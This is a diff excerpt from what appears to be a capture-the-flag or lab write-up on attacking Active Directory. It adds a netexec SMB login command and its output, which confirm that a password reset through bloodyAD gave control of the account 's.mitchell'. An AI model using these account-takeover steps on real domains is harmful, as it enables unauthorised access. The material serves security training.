@@ -333,4 +333,12 @@ Using this new user, ill look at bloodhound and i see this user has the ability 
 
 Ill use bloodyAD to change the password
 
+```python
+❯❯❯ nxc smb dc01.orion.local -u 's.mitchell' -p 'Password123!' 
+SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.5        445    DC01             [+] orion.local\s.mitchell:Password123! 
+```
+
+This user is compromised
+
 
